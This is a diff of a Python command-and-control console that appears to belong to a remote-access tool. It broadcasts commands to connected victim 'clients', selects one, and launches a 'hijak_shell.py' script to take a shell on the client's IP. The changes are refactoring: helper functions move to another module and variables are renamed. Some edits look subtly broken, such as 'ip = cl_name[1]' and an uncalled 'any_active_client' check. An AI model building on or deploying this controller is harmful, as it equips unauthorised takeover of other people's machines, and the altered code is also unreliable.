@@ -2,37 +2,13 @@ from server import *
 from cmd_type_helper import *
 import time
 import subprocess
+from help_utils import *
 
-
-
-####################### help functions #######################################
-def is_num(s):
-    b_Int = True
-    try:
-        # converting to integer
-        int(s)
-    except ValueError:
-        b_Int = False
-    return b_Int
-
-
-def ask_list_index(instruction, list_len):
-    op = input(instruction)
-    cond = is_num(op) and int(op)>=1 and int(op) < list_len+1
-
-    while(not cond):
-        print('please choose number from the list!')
-        op = input(instruction)
-        cond = is_num(op) and int(op)>=1 and int(op) < list_len+1
-    index = int(op)-1
-    return index
-
-##################################################################
 
 
 #######################  CLI FUNCTIONS ###########################
 def get_active_conns():
-    connected_clients = filter(lambda addr: clients_status[addr] == 'ON', clients_status.keys())
+    connected_clients = filter(lambda cl_name: clients_status[cl_name] == 'ON', clients_status.keys())
     return list(connected_clients)
 
 def any_active_client():
@@ -60,8 +36,8 @@ def show_conn_stats():
 
 def broadcast(cmd):
     active_clients      = get_active_conns()
-    for addr in active_clients: 
-        conn = clients_conns[addr]
+    for cl_name in active_clients: 
+        conn = clients_conns[cl_name]
         send_msg(conn, cmd)
 
 
@@ -83,13 +59,13 @@ def choose_client():
     for i in range(list_len):
         print(i+1, "  " ,active_clients[i])
     client_index = ask_list_index(instruction="Choose Client:", list_len=list_len )
-    addr = active_clients[client_index]
-    conn = clients_conns[addr]
-    return conn, addr
+    cl_name = active_clients[client_index]
+    conn = clients_conns[cl_name]
+    return conn, cl_name
 
 
 def show_responses():
-    filepath = os.path.join(os.getcwd(), "responses")
+    filepath = os.path.join(os.getcwd(), "responses.txt")
     try:
         with open(filepath, "r") as f:
             data = f.read()
@@ -112,7 +88,7 @@ enter anything else to GO BACK to main menu. <----\n\n""")
 
 
 def start_hijak(args):
-    subprocess.run(args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(args, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
 ###################################################################
 
@@ -145,9 +121,9 @@ def main_menu():
                 if not any_active_client: # if returned false
                     continue                # go to main menu
 
-                client_conn, addr = choose_client()
+                client_conn, cl_name = choose_client()
                 if cmd.type == 'take_shell': 
-                    ip = addr[0]
+                    ip = cl_name[1]
                     args_to_run = [sys.executable,'hijak_shell.py',ip]+cmd.args
                     thread   = threading.Thread(target=start_hijak, args=(args_to_run,))
                     thread.start()
@@ -169,13 +145,13 @@ def main_menu():
         elif Op == '2':
             if not any_active_client(): # if returned false
                 continue                # go to main menu
-            cl,addr = choose_client()
+            cl,cl_name = choose_client()
             subOp = input("""Are you sure?\n 
             1)  YES. \n
             2)  <---  Go Back  <--- \n""")
             if subOp!='1':
                 continue
-            client_disconnect(cl,addr)
+            client_disconnect(cl,cl_name)
             continue
 
         elif Op == '3':
